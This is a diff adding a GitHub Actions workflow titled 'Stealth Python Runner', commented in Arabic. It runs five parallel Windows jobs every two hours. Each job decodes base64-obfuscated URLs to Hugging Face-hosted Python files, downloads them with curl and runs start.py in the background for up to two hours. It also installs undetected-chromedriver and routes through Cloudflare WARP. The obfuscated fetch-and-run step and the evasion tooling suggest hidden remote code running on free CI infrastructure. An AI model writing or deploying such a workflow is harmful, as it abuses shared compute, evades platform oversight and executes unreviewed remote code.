@@ -1,0 +1,76 @@
+name: Stealth Python Runner
+
+on:
+  workflow_dispatch: # السماح بالتشغيل اليدوي
+  schedule:
+    - cron: '0 */2 * * *' # تشغيل مجدول كل ساعتين
+
+jobs:
+  execute-workers:
+    name: Worker Node ${{ matrix.node }}
+    runs-on: windows-2022
+    timeout-minutes: 125 # الحد الأقصى لوقت الوظيفة
+    
+    strategy:
+      fail-fast: false
+      matrix:
+        node: [1, 2, 3, 4, 5] # تشغيل 5 خوادم متوازية
+
+    steps:
+      # ==========================================
+      # الخطوة الأولى: التهيئة وتنزيل الملفات المشفرة
+      # ==========================================
+      - name: Initialize Workspace
+        shell: bash
+        run: |
+          echo "🔄 Preparing node ${{ matrix.node }}..."
+          
+          # فك تشفير الروابط وتحميلها ديناميكياً (Base64)
+          URL1=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 -d)
+          URL2=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9uYW5uaS9yZXNvbHZlL21haW4vc3RhcnQyLnB5" | base64 -d)
+          
+          curl -sL "$URL1" -o hash.py
+          curl -sL "$URL2" -o start.py
+          
+          echo "⚙️ Installing dependencies..."
+          python -m pip install -q --upgrade pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "✔️ Setup complete."
+
+      # ==========================================
+      # الخطوة الثانية: التشغيل وإدارة الوقت
+      # ==========================================
+      - name: Launch Application with Timeout Control
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "▶️ Executing main script on Node ${{ matrix.node }}"
+          
+          # تحديث متغيرات بيئة النظام
+          $env:PATH += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          # تشغيل السكربت في الخلفية
+          $appProcess = Start-Process -FilePath "python" -ArgumentList "start.py" -PassThru -NoNewWindow
+          
+          Write-Host "⏳ Monitoring process for max 120 minutes (7200s)..."
+          
+          try {
+              # مراقبة العملية حتى تنتهي أو تتجاوز الساعتين
+              $appProcess | Wait-Process -Timeout 7200 -ErrorAction Stop
+              Write-Host "🟢 Task completed successfully within timeframe."
+          } 
+          catch {
+              # تفعيل الإيقاف الإجباري إذا تجاوز الوقت الساعتين
+              Write-Warning "⚠️ Execution exceeded 120 minutes. Force stopping..."
+              $appProcess | Stop-Process -Force
+              Write-Host "🔴 Task killed to prevent hanging."
+          }
+
+      # ==========================================
+      # الخطوة الثالثة: تقرير الإغلاق
+      # ==========================================
+      - name: Finalize
+        shell: bash
+        run: |
+          echo "✅ Worker ${{ matrix.node }} finished its cycle."
